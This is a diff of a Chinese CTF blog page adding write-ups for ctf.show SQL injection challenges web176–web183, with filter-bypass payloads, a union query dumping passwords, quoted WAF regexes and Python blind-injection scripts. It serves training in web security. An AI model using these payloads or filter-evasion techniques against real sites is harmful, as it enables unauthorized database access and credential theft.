@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：633字</p>
+      <p>字数：926字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：3分钟</p>
+      <p>时长：5分钟</p>
     </a>
   </div>
 
@@ -500,6 +500,44 @@
 <h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>返回结果过滤了<code>\x00-\x7f</code>  直接盲注吧 bool盲注也不行了 换时间盲注</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://40dd5eb6-18de-48c2-bb1e-db759aa222bd.chall.ctf.show/api/v5.php?id=1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&#x27;\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\&#x27;flag\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)--+&#x27;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.get(url+p1,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url+p2,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; or 1%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>过滤空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤空格 过滤/**/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;%09or%091%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>过滤%09</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;or(1)%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>注释符号过滤了 指定id绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<p>联合查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||id&#x3D;26||&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>sql</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select count(pass) from &quot;</span>.$_POST[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1e1b7dde-8bd4-4a70-9517-4b8b96427db3.chall.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
 
           
             <div class='article_footer'>
@@ -556,10 +594,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-26T22:58:13+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-17T22:03:33+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2021年1月26日</p>
+    <p>更新于：2021年2月17日</p>
   </a>
 </div>
 
@@ -701,7 +739,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-text">web175</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-text">web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web181"><span class="toc-text">web181</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web182"><span class="toc-text">web182</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web183"><span class="toc-text">web183</span></a></li></ol></li></ol>
     </div>
   </section>
 
